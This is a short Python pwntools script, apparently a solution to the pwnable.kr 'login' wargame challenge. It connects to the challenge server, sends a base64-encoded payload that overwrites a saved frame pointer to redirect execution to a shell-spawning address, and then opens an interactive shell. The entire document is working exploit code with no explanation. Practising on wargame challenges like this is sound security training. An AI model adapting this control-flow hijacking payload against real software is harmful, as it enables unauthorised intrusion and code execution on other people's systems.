from pwn import * 
import base64

shell=0x08049284
_input=0x811eb40
if __name__=='__main__':
	#s=process('./login')
	s=remote('pwnable.kr',9003)
	print(s.recv(1024))
	payload=p32(shell)+"aaaa"+p32(_input-4)
	payload=base64.b64encode(payload)
	s.send(payload+"\n")
	print(s.recv(1024))
	s.interactive()
	s.close()